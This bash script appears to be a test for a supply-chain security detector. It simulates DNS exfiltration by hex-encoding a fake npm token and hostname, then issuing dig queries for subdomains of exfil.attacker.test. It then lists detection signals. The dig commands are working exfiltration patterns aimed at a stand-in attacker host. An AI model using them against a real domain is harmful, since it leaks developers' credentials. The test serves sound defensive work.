#!/bin/bash
# =============================================================================
# Fenceline Test: DNS Data Exfiltration
# =============================================================================
# Simulates: Encoding stolen data in DNS subdomain queries
# Real-world examples: Various APT techniques, npm packages using DNS tunneling
#
# Attack pattern:
#   1. Package collects sensitive data (tokens, env vars, hostnames)
#   2. Encodes data as subdomain labels (base64/hex)
#   3. Makes DNS lookups to attacker-controlled nameserver
#   4. Attacker reads data from DNS query logs
#
# Why this works:
#   - DNS is rarely monitored or blocked in dev environments
#   - Firewalls that block HTTP still allow DNS
#   - No direct TCP connection to attacker server needed
#
# Safety: Uses 'dig' against localhost/loopback only. No real DNS exfil occurs.
#         The simulated queries target .invalid and .test TLDs per RFC 6761.
# =============================================================================

set -euo pipefail

echo "============================================="
echo "  Fenceline Test: DNS Data Exfiltration"
echo "============================================="
echo ""

# --- SETUP ---
echo "[SETUP] Preparing simulated exfiltration data..."
FAKE_TOKEN="npm_SimulatedTokenNotReal123456"
FAKE_HOSTNAME="dev-workstation"

# Encode data as hex (simulating what real exfil malware does)
ENCODED_TOKEN=$(echo -n "$FAKE_TOKEN" | xxd -p | head -c 60)
ENCODED_HOST=$(echo -n "$FAKE_HOSTNAME" | xxd -p)

echo "[SETUP] Simulated token (hex): ${ENCODED_TOKEN:0:20}..."
echo "[SETUP] Simulated hostname (hex): $ENCODED_HOST"
echo ""

# --- SIMULATION ---
echo "[SIMULATION] Simulating DNS exfiltration patterns..."
echo ""

# Pattern 1: Data encoded in subdomain (long subdomain query)
echo "[SIM 1/3] Long subdomain query (data encoded in subdomain labels)"
EXFIL_DOMAIN="${ENCODED_TOKEN:0:30}.${ENCODED_TOKEN:30:30}.exfil.attacker.test"
echo "  -> Query: $EXFIL_DOMAIN"
echo "  -> Label length: ${#ENCODED_TOKEN} chars across subdomains"
# Use dig but expect failure (non-existent domain, that's fine)
dig +short +timeout=1 +tries=1 "$EXFIL_DOMAIN" A 2>/dev/null || true
echo "  -> DNS lookup attempted (expected to fail, .test TLD is not routable)"
echo ""

# Pattern 2: Multiple sequential queries (chunked exfiltration)
echo "[SIM 2/3] Chunked exfiltration (multiple sequential DNS queries)"
CHUNKS=("chunk1" "chunk2" "chunk3" "chunk4")
for i in "${!CHUNKS[@]}"; do
    QUERY="${CHUNKS[$i]}.${ENCODED_HOST}.seq${i}.exfil.attacker.test"
    echo "  -> Query $((i+1))/4: $QUERY"
    dig +short +timeout=1 +tries=1 "$QUERY" A 2>/dev/null || true
done
echo "  -> 4 sequential DNS lookups (chunked data pattern)"
echo ""

# Pattern 3: TXT record query (larger payload per query)
echo "[SIM 3/3] TXT record exfiltration (larger payload encoding)"
TXT_QUERY="${ENCODED_HOST}.txt-exfil.attacker.test"
echo "  -> TXT Query: $TXT_QUERY"
dig +short +timeout=1 +tries=1 "$TXT_QUERY" TXT 2>/dev/null || true
echo "  -> TXT record lookup attempted"
echo ""

# --- DETECTION POINTS ---
echo "============================================="
echo "  DETECTION POINTS"
echo "============================================="
echo ""
echo "A supply chain detector should flag ALL of the following:"
echo ""
echo "  1. UNUSUAL DNS QUERY PATTERNS"
echo "     -> Subdomain labels longer than 30 characters"
echo "     -> Hex or base64 encoded strings in subdomain labels"
echo "     -> Multiple sequential queries to same parent domain"
echo "     -> High query volume to previously unseen domains"
echo ""
echo "  2. DNS QUERIES TO UNKNOWN DOMAINS"
echo "     -> Package install should only resolve registry domains"
echo "     -> Any DNS query to a domain not in the deep map is suspicious"
echo "     -> Queries to recently registered domains are high risk"
echo ""
echo "  3. DNS QUERY TIMING"
echo "     -> Burst of DNS queries immediately after package install"
echo "     -> Sequential queries with small delays (chunked transfer)"
echo "     -> DNS queries from a process that shouldn't need DNS"
echo ""
echo "  4. ENCODING INDICATORS"
echo "     -> Hex-encoded subdomains (continuous [0-9a-f] strings)"
echo "     -> Base64-encoded subdomains (alphanumeric with = padding)"
echo "     -> Entropy analysis: random-looking subdomain labels"
echo ""
echo "[RESULT] Test simulation complete."
